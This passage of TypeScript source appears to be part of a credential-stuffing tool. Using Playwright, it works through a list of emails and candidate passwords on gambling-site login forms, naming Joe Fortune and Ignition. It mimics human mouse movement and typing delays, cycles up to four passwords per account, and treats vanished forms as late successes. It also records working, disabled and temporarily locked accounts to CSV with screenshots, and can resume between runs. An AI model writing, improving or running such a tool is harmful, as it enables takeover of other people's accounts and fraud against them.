    await page.mouse.move(100 + Math.random() * 500, 100 + Math.random() * 500);
    await this.sleep(100 + Math.random() * 200);
    await page.mouse.wheel(0, 100 + Math.random() * 200);
    await this.sleep(200 + Math.random() * 300);
    await page.mouse.wheel(0, -(50 + Math.random() * 100)); // scroll back up a bit
    await this.sleep(100 + Math.random() * 200);

    // ── Fill email (fast autofill) ──
    await page.fill(selectors.username, cred.email);
    await this.sleep(500);
    await this.captureScreenshot(page, `${site.name}:email-filled`);

    // ── Build password sequence ──
    const passwords = this.buildPasswordSequence(cred.passwords, batchIndex);
    if (passwords.length === 0) {
      this.log("WARN", `  ${site.name}: no passwords available for batch ${batchIndex} — skipping`);
      return { outcome: "noaccount", attempts: 0 };
    }
    const hasAltPw = cred.passwords.length > 1;
    this.log("INFO", `  ${site.name}: batch ${batchIndex} · ${hasAltPw ? "multi-password" : "single + fallbacks"} \u2014 ${passwords.length} attempts`);

    // ── Password retry loop ──
    let lastResponse: LoginResponse | null = null;
    for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
      const pw = passwords[attemptIdx];
      const attemptNum = attemptIdx + 1;
      const isRetry = attemptIdx === 3; // 4th attempt is a re-press of same password

      // ── Late-success check: if previous attempt was "other" and the form has
      // since vanished (or URL moved off /login), the prior submit actually
      // succeeded — Joe Fortune sometimes replaces the form 10-15s post-click.
      if (attemptIdx > 0 && lastResponse === "other") {
        try {
          const vanished = await page.evaluate(
            ({ submitSel, passwordSel }: { submitSel: string, passwordSel: string }) => {
              if (!submitSel || !passwordSel) return false;
              return !document.querySelector(submitSel) && !document.querySelector(passwordSel);
            },
            { submitSel: selectors.submit, passwordSel: selectors.password }
          );
          const urlMoved = this.isUrlChangedAwayFromLogin(site.url, page.url());
          if (vanished || urlMoved) {
            this.log("INFO", `  ${site.name}: ✅ late success detected before attempt ${attemptNum} (vanished=${vanished} urlMoved=${urlMoved})`);
            await this.captureScreenshot(page, `${site.name}:late-success`);
            return { outcome: "success", attempts: attemptIdx };
          }
        } catch { /* page closed — fall through to normal handling */ }
      }

      // ── Fill + submit, with vanished-form detection ──
      // If the form disappears mid-attempt (Joe Fortune late-redirect pattern),
      // page.fill/hover/click will throw "Element not found". When that happens
      // and the form really is gone (or URL moved off /login), treat as success.
      try {
        if (!isRetry) {
          await page.fill(selectors.password, pw);
          await this.sleep(500);
          this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: ${pw.substring(0, 3)}***`);
        } else {
          this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: re-pressing login`);
        }

        if (attemptIdx === 0) {
          await this.dismissCookieNotice(page, site.name);
        }

        resetNetworkDetection();
        await page.evaluate(() => { (window as any).__casinoStatus = null; }).catch(() => { });

        await page.hover(selectors.submit);
        await this.sleep(100 + Math.random() * 200);
        await page.click(selectors.submit, { delay: 30 + Math.random() * 50 });
      } catch (interactErr: any) {
        const msg = interactErr?.message || String(interactErr);
        const isElementErr = /element not found|timeout .* exceeded|waiting for selector|locator|target closed/i.test(msg);
        if (isElementErr && attemptIdx > 0) {
          // Form may have been replaced by post-login content during the gap
          // between attempts \u2014 confirm by checking the page state.
          try {
            const vanished = await page.evaluate(
              ({ submitSel, passwordSel }: { submitSel: string, passwordSel: string }) => {
                if (!submitSel || !passwordSel) return false;
                return !document.querySelector(submitSel) && !document.querySelector(passwordSel);
              },
              { submitSel: selectors.submit, passwordSel: selectors.password }
            ).catch(() => false);
            const urlMoved = this.isUrlChangedAwayFromLogin(site.url, page.url());
            if (vanished || urlMoved) {
              this.log("INFO", `  ${site.name}: \u2705 mid-attempt vanish success on attempt ${attemptNum} (vanished=${vanished} urlMoved=${urlMoved})`);
              await this.captureScreenshot(page, `${site.name}:mid-vanish-success`);
              return { outcome: "success", attempts: attemptIdx };
            }
          } catch { /* page closed */ }
        }
        throw interactErr;
      }

      // ── Fast-poll race: network trap + Shadow-DOM observer (500ms window) ──
      // Catches verdicts before tab redirects/closes on success or error overlays
      let fastStatus: LoginResponse | null = null;
      const pollStart = Date.now();
      const uiRace = page.waitForFunction(
        () => (window as any).__casinoStatus,
        null,
        { timeout: 500, polling: 25 }
      ).then(async (h) => (await h.jsonValue()) as LoginResponse).catch(() => null);
      while (Date.now() - pollStart < 500) {
        if (page.isClosed()) break;
        const net = getNetworkDetection();
        if (net) { fastStatus = net; break; }
        await new Promise((r) => setTimeout(r, 5));
      }
      if (!fastStatus) fastStatus = (await uiRace) || getNetworkDetection();
      if (fastStatus) {
        this.log("INFO", `  ${site.name}: fast-detected "${fastStatus}" in ${Date.now() - pollStart}ms`);
      }

      // ── Fall back to slower DOM scan if fast race didn't catch anything ──
      const timeout = attemptIdx === 2 ? 5000 : 15000;
      const response: LoginResponse = fastStatus || await this.waitForLoginResponse(
        page, timeout, site.url, selectors.submit, selectors.password,
      );

      // ── Screenshot after response ──
      await this.sleep(500);
      await this.captureScreenshot(page, `${site.name}:attempt-${attemptNum}-${response}`);

      // ── Handle response ──
      if (response === "success") {
        this.log("INFO", `  ${site.name}: ✅ login success on attempt ${attemptNum}`);
        return { outcome: "success", attempts: attemptNum };
      }

      if (response === "disabled") {
        throw new PermDisabledError();
      }

      if (response === "tempdisabled") {
        throw new TempDisabledError();
      }

      // response === "incorrect", "timeout", or "other"
      lastResponse = response;
      if (attemptNum < 4) {
        this.log("WARN", `  ${site.name}: ${response} on attempt ${attemptNum} \u2014 trying next password`);
      } else {
        // 4th attempt still incorrect/timeout \u2192 no_account
        this.log("WARN", `  ${site.name}: ${response} on attempt 4 \u2014 confirmed no_account`);
        return { outcome: "noaccount", attempts: attemptNum };
      }
    }

    // Should not reach here, but safety fallback
    return { outcome: "noaccount", attempts: passwords.length };
  }

  /** Site-specific cookie selectors (calibrated per target) */
  private static readonly SITE_COOKIE_SELECTORS: { [site: string]: string[] } = {
    joe: [
      'button:has-text("ACCEPT ALL")',
      'button:has-text("Accept All")',
      'button:has-text("Accept all")',
    ],
    ignition: [
      'button:has-text("ACCEPT ALL")',
      'button:has-text("Accept All")',
      'button:has-text("Accept all")',
    ],
  };

  /** Generic fallback cookie selectors */
  private static readonly GENERIC_COOKIE_SELECTORS = [
    'button:has-text("Accept")',
    'button:has-text("Accept Cookies")',
    'button:has-text("Allow All")',
    'button:has-text("Allow all")',
    'button:has-text("Agree")',
    'button:has-text("I Agree")',
    'button:has-text("Got it")',
    'button:has-text("OK")',
    'a:has-text("Accept")',
    'a:has-text("Accept All")',
    '#onetrust-accept-btn-handler',
    '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
    '#cookie-accept',
    '#accept-cookies',
    '#acceptCookies',
    '#gdpr-accept',
    '.cookie-accept',
    '.accept-cookies',
    '[aria-label="Accept"]',
    '[aria-label="Accept All"]',
    '[aria-label="Accept cookies"]',
    '[data-action="accept"]',
    '[data-cookie-accept]',
    '[data-testid="cookie-accept"]',
  ];

  /** Dismiss cookie consent banners — site-specific first, generic fallback */
  private async dismissCookieNotice(page: Page, siteName: string): Promise<void> {
    // Try site-specific selectors first (fast path)
    const siteSelectors = AutomationEngine.SITE_COOKIE_SELECTORS[siteName] || [];
    for (const selector of siteSelectors) {
      try {
        const btn = page.locator(selector).first();
        if (await btn.isVisible({ timeout: 300 })) {
          await btn.click();
          this.log("INFO", `  🍪 Dismissed cookie notice via calibrated: ${selector}`);
          await this.sleep(500);
          return;
        }
      } catch {
        // Selector didn't match — try next
      }
    }

    // Fallback to generic selectors
    for (const selector of AutomationEngine.GENERIC_COOKIE_SELECTORS) {
      try {
        const btn = page.locator(selector).first();
        if (await btn.isVisible({ timeout: 200 })) {
          await btn.click();
          this.log("INFO", `  🍪 Dismissed cookie notice via fallback: ${selector}`);
          await this.sleep(500);
          return;
        }
      } catch {
        // Selector didn't match — try next
      }
    }
  }

  /** Capture a screenshot, save to disk under screenshots/, and emit it as a log event */
  private async captureScreenshot(page: Page, label: string): Promise<void> {
    try {
      const buf = await page.screenshot({ type: "jpeg", quality: 70 });
      const b64 = buf.toString("base64");
      const dir = path.join(process.cwd(), "screenshots");
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      const ts = new Date().toISOString().replace(/[:.]/g, "-");
      const safeLabel = label.replace(/[^a-zA-Z0-9._-]+/g, "_");
      const filePath = path.join(dir, `${ts}_${safeLabel}.jpg`);
      fs.writeFileSync(filePath, buf);
      this.emit("screenshot", { label, base64: b64, timestamp: new Date().toISOString(), path: filePath });
      this.log("SNAP", `📸 ${label} → ${path.relative(process.cwd(), filePath)}`);
    } catch {
      this.log("WARN", `Screenshot failed: ${label}`);
    }
  }

  private writeResultsCSV(targets: SiteConfig[]): void {
    const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
    const lines = [header];
    for (const row of this.rows) {
      for (const target of targets) {
        const s = row.sites[target.name];
        const err = this.stripAnsi((s.error || "").replace(/"/g, "'").replace(/[\r\n]+/g, " ")).substring(0, 200);
        lines.push(
          `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
        );
      }
    }
    fs.writeFileSync("results.csv", lines.join("\n"), "utf-8");
    this.log("INFO", `Results saved to results.csv`);
  }

  /** Write a single row's results to CSV incrementally (append mode, write header on first row) */
  private writeRowResultCSV(targets: SiteConfig[], row: RowStatus, isFirst: boolean): void {
    try {
      const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
      const lines: string[] = [];
      if (isFirst) lines.push(header);
      for (const target of targets) {
        const s = row.sites[target.name];
        const err = this.stripAnsi((s.error || "").replace(/"/g, "'").replace(/[\r\n]+/g, " ")).substring(0, 200);
        lines.push(
          `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
        );
      }
      fs.appendFileSync("results.csv", (isFirst ? "" : "\n") + lines.join("\n"), "utf-8");
    } catch {
      this.log("WARN", `Failed to write incremental result for ${row.email}`);
    }
  }

  /** Resume support: returns true if this row was completed in a prior run
   *  AND no expired tempdisabled cooldown demands a retest. */
  private isRowAlreadyDone(idx: number): boolean {
    const row = this.rows[idx];
    if (row.status !== "done") return false;
    if (row.tempDisabledUntil && new Date(row.tempDisabledUntil).getTime() < Date.now()) {
      return false;  // cooldown elapsed — retest with next batch
    }
    return true;
  }

  /** Resume support: hydrate this.rows from progress.json, matching by email.
   *  Returns the count of rows restored to a "done" state. */
  private loadProgress(targets: SiteConfig[]): number {
    if (!fs.existsSync(PROGRESS_FILE)) return 0;
    try {
      const data = JSON.parse(fs.readFileSync(PROGRESS_FILE, "utf-8"));
      if (!Array.isArray(data.rows)) return 0;
      const priorByEmail = new Map<string, RowStatus>();
      for (const r of data.rows) {
        if (r && typeof r.email === "string") priorByEmail.set(r.email.toLowerCase(), r);
      }
      let restored = 0;
      for (const row of this.rows) {
        const prior = priorByEmail.get(row.email.toLowerCase());
        if (!prior) continue;
        row.status = prior.status;
        row.currentBatch = prior.currentBatch ?? 0;
        row.sessionId = prior.sessionId;
        row.recordingUrl = prior.recordingUrl;
        row.tempDisabledUntil = prior.tempDisabledUntil;
        row.scheduledRetestAt = prior.scheduledRetestAt;
        if (prior.sites && typeof prior.sites === "object") {
          for (const t of targets) {
            const ps = (prior.sites as any)[t.name];
            if (ps) {
              row.sites[t.name].outcome = ps.outcome;
              row.sites[t.name].attempts = ps.attempts ?? 0;
              row.sites[t.name].error = ps.error;
            }
          }
        }
        if (this.isRowAlreadyDone(row.rowIndex)) restored++;
      }
      return restored;
    } catch (e: any) {
      this.log("WARN", `Failed to load ${PROGRESS_FILE}: ${(e.message || String(e)).substring(0, 100)}`);
      return 0;
    }
  }

  /** Resume support: persist current row state to progress.json (called after every row). */
  private saveProgress(): void {
    try {
      const data = { updatedAt: new Date().toISOString(), rows: this.rows };
      fs.writeFileSync(PROGRESS_FILE, JSON.stringify(data, null, 2), "utf-8");
    } catch { /* disk-full / permission — non-fatal */ }
  }

  private emitRowUpdate(idx: number): void {
    this.emit("row-update", JSON.parse(JSON.stringify(this.rows[idx])));
  }

  private log(level: string, message: string): void {
    this.emit("log", {
      level,
      message,
      timestamp: new Date().toISOString(),
    });
  }

  private sleep(ms: number): Promise<void> {
    return new Promise((r) => setTimeout(r, ms));
  }

  /** Strip ANSI escape codes from strings */
  private stripAnsi(str: string): string {
    return str.replace(/\u001b\[[0-9;]*m/g, "");
  }

  /** Parse a single CSV line respecting quoted fields (RFC 4180 compatible, accepts both formats) */
  private parseCsvLine(line: string): string[] {
    const fields: string[] = [];
    let current = "";
    let inQuotes = false;
    for (let i = 0; i < line.length; i++) {
      const ch = line[i];
      if (inQuotes) {
        if (ch === '"') {
          if (i + 1 < line.length && line[i + 1] === '"') {
            current += '"';
            i++; // skip escaped quote
          } else {
            inQuotes = false;
          }
        } else {
          current += ch;
        }
      } else {
        if (ch === '"') {
          inQuotes = true;
        } else if (ch === ",") {
          fields.push(current);
          current = "";
        } else {
          current += ch;
        }
      }
    }
    fields.push(current);
    return fields;
  }

  /**
   * Resolve selectors for a site — try configured selectors first,
   * auto-detect visible inputs as fallback when page loaded but selectors changed.
   */
  private async resolveSelectors(
    page: Page,
    site: SiteConfig
  ): Promise<{ username: string; password: string; submit: string }> {
    // Try configured selectors
    try {
      const [uVis, pVis, sVis] = await Promise.all([
        page.locator(site.selectors.username).first().isVisible({ timeout: 2000 }).catch(() => false),
        page.locator(site.selectors.password).first().isVisible({ timeout: 2000 }).catch(() => false),
        page.locator(site.selectors.submit).first().isVisible({ timeout: 2000 }).catch(() => false),
      ]);
      if (uVis && pVis && sVis) {
        this.log("INFO", `  ${site.name}: configured selectors found`);
        return site.selectors;
      }
      this.log("WARN", `  ${site.name}: configured selectors missing (user=${uVis} pass=${pVis} submit=${sVis}) \u2014 auto-detecting...`);
    } catch {
      this.log("WARN", `  ${site.name}: selector check failed \u2014 auto-detecting...`);
    }

    // Auto-detect fallback
    const usernameCandidates = [
      'input[type="email"]', 'input[type="text"]', 'input[name="email"]',
      'input[name="username"]', 'input[placeholder*="mail" i]', 'input[placeholder*="user" i]',
      'input[autocomplete="email"]', 'input[autocomplete="username"]',
    ];
    const passwordCandidates = [
      'input[type="password"]', 'input[name="password"]',
    ];
    const submitCandidates = [
      'button[type="submit"]', 'input[type="submit"]',
      'button:has-text("Log In")', 'button:has-text("Login")',
      'button:has-text("Sign In")', 'button:has-text("LOG IN")',
      'button:has-text("SIGN IN")',
    ];

    const username = await this.findFirstVisible(page, usernameCandidates);
    const password = await this.findFirstVisible(page, passwordCandidates);
    const submit = await this.findFirstVisible(page, submitCandidates);

    if (!username || !password || !submit) {
      throw new Error(`Auto-detect failed for ${site.name}: username=${!!username} password=${!!password} submit=${!!submit}`);
    }

    this.log("INFO", `  ${site.name}: auto-detected selectors: ${username}, ${password}, ${submit}`);
    return { username, password, submit };
  }

  /** Find the first visible element from a list of candidate selectors */
  private async findFirstVisible(page: Page, candidates: string[]): Promise<string | null> {
    for (const sel of candidates) {
      try {
        if (await page.locator(sel).first().isVisible({ timeout: 500 })) {
          return sel;
        }
      } catch {
        // not found
      }
    }
    return null;
  }
}
